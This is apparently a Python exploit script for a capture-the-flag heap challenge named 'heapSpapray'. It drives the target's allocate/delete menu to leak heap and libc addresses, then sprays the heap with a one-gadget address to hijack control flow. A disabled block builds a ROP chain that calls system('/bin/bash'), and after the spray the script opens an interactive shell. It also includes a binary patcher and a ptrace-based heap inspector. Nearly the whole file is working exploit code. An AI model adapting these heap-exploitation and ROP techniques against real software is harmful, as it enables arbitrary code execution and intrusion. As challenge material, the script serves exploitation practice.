#!/usr/bin/env python

from chdrft.cmds import CmdsList
from chdrft.main import app
from chdrft.utils.cmdify import ActionHandler
from chdrft.utils.misc import Attributize
import chdrft.utils.misc as cmisc
import glog
from chdrft.tube.connection import Connection
from chdrft.tube.process import Process
from contextlib import ExitStack
from chdrft.utils.misc import PatternMatcher
import random
import time
from chdrft.utils.fmt import Format
import re
import struct
from chdrft.emu.base import Memory
from chdrft.emu.binary import Arch, FilePatcher, x86_64_arch
from chdrft.emu.trace import Display
import threading
import sys
import pprint
import traceback as tb
import os
import math
from chdrft.interactive.base import create_kernel
from chdrft.utils.proc import ProcHelper
import mmap
import subprocess as sp
from chdrft.emu.elf import ElfUtils
from chdrft.pwn.base import Pwn

global flags, cache
flags = None
cache = None

MAXN = 100000 - 1


def args(parser):
  clist = CmdsList().add(test).add(analyse).add(patch)
  parser.add_argument('--local', action='store_true')
  parser.add_argument('--pid', type=int)
  ActionHandler.Prepare(parser, clist.lst)


class Client(ExitStack):

  def __init__(self, conn):
    super().__init__()
    self.conn = conn

  def __enter__(self):
    super().__enter__()
    self.enter_context(self.conn)
    self.conn.recv_until('[3] Exit\n>>>')
    return self

  def create(self, buf, n=None):
    buf = Format(buf).tobytes().v

    assert buf.find(b'\n') == -1
    if n == None:
      n = len(buf) + 1
    buf = buf[:n - 1]
    buf += b'\n'
    assert n < MAXN
    self.conn.send(f'1\n{n}\n')
    res = self.conn.send_and_expect(buf, '[3] Exit\n>>>')
    m = re.search(b'Index\[(\d+)\] <> size\[\d+\]\n', res)
    idx = int(m.group(1))
    rem = res[m.end(0):]
    rem = rem[:n - 1]
    return idx, rem

  def delete(self, idx):
    self.conn.send_and_expect(f'2\n{idx}\n', '[3] Exit')

  def quit(self):
    self.conn.send(b'3\n')


  def send_raw(self, buf):
    assert buf.find(b'\n') == -1, buf
    self.conn.send(buf + b'\n')



def tryit():
  print('\n')
  random.seed(0)
  #conn = Connection('finale-docker.rtfm.re', 2323)
  if flags.local:
    conn = Process('./heapSpapray.patched')
    conn = Process('./heapSpapray')
  else:
    conn = Connection('localhost', 1234)
  libc = ElfUtils('/usr/lib/libc.so.6')
  binary = ElfUtils('./heapSpapray')
  get_out_offset = binary.get_symbol('get_out')

  with Client(conn) as c:
    buf = b'a' * 0x10
    dd = []

    c.create('', n=0x1000)
    c.create('', n=0x1000)
    c.create('', n=123)
    c.create('', n=123)
    c.delete(0)

    sz = 0x1500
    target = None
    for i in range(10):
      e = c.create('', n=sz+1)
      content = struct.unpack(f'<{sz // 8}Q', e[1])
      get_out_addr = None
      for v in content:
        mask = 0xfff
        if (v & mask) == (get_out_offset & mask):
          get_out_addr = v
          target = e
          break
      if get_out_addr is not None:
        break
    else:
      return

    for i in range(3):
      dd.append(c.create(f'', n=0x1000))
    c.delete(dd.pop(1)[0])

    dd.append(c.create(f'', n=100))
    dd.append(c.create(f'', n=100))

    top_chunk = struct.unpack('<Q', dd[-1][1][:8])[0]
    main_arena = top_chunk - Pwn.kMainArenaToChunkOffset

    get_out_to_get_input_string = binary.get_symbol('get_input_string') + 4 - get_out_offset

    libc.offset = main_arena -libc.get_symbol('main_arena')
    get_input_string_addr = get_out_addr + get_out_to_get_input_string
    get_input_no_rbp = get_input_string_addr + 4 # skip push rbp; mov rsp rbp
    puts_addr = libc.get_symbol('puts')


    c.delete(target[0])

    gadget = libc.offset + 0x45200
    #payload = struct.pack('<Q', get_input_no_rbp) * (sz // 8) # crude
    payload = struct.pack('<Q', gadget) * (sz // 8) # crude
    c.create(payload, n=sz+1)

    f=c.create('', n=0x20)
    e=c.create('', n=0x20)
    e=c.create('', n=0x20)
    c.create('', n=0x20)
    c.delete(e[0])
    c.delete(f[0])
    e = c.create('', n=0x20)
    tb = x86_64_arch.typs_helper.unpack_multiple('u64', e[1])
    if tb[1] == 0:
      return

    heap_addr = tb[1]
    print('HEAP > ', hex(heap_addr))


    #input('trigger')
    c.quit()
    try:
      res = conn.recv_until('Loser', timeout=4)
      return
    except cmisc.TimeoutException:
      print('Should have sprayed')
    except EOFError:
      pass

    input('continue?')
    conn.interactive()
    return

    if 0:
      ret_gadget = libc.offset + 0x0000000000022497
      rdi_gadget = libc.offset + 0x23be3
      rdx_rsi_gadget = libc.offset + 0x0000000000109159
      system_addr = libc.get_symbol('system')

      stage2 = struct.pack('<Q', ret_gadget) * 10
      stage2 += struct.pack('<QQ', rdi_gadget, heap_addr)
      stage2 += struct.pack('<QQQ', rdx_rsi_gadget, 0, 0x100)
      stage2 += struct.pack('<Q', get_input_string_addr)

      stage2 += struct.pack('<QQ', rdi_gadget, heap_addr)
      stage2 += struct.pack('<Q', system_addr)

      c.send_raw(stage2)
      c.send_raw(b'/bin/bash')
      input('DONE')



def test(ctx):
  for i in range(100):

    tryit()

def patch(ctx):
  arch = x86_64_arch
  fp = FilePatcher('./heapSpapray', arch.mc, ofile='./heapSpapray.patched', dry=0)
  fp.patch_one_ins(0xd6f, 'mov edi, 0')
  fp.patch_one_ins(0xe7f, 'mov eax, 0x1893')
  fp.apply()


def analyse(ctx):
  if 0:
    proc = sp.Popen('./a.out')
    ctx.pid = proc.pid
  ph = ProcHelper(ctx.pid)
  regions = ph.get_memory_regions()
  entry = regions.get_elf_entry(cmisc.PatternMatcher.smart('libc', re=1))

  elf = ElfUtils(entry.file, offset=entry.start_addr)
  top_chunk = elf.get_symbol('main_arena') + Pwn.kMainArenaToChunkOffset


  import ptrace.debugger
  dbg = ptrace.debugger.PtraceDebugger()
  px = dbg.addProcess(ctx.pid, False)
  heap = cmisc.get_uniq(filter(lambda x: x.typ == 'heap', regions.regions))
  mem = Memory(reader=px.readBytes, writer=px.writeBytes, arch=Arch.x86_64)
  data = mem.read_nptr(heap.start_addr, sz=heap.size)

  print(mem.xxd(heap.start_addr, heap.size))
  idx = [heap.start_addr + i* 8 for i,v in enumerate(data) if v == top_chunk]
  print('FOUND >> ', len(idx), 'target: ', hex(top_chunk))
  for v in idx:
    print(mem.xxd(v-0x10, 0x40))



def main():
  ctx = Attributize()
  ActionHandler.Run(ctx)


app()
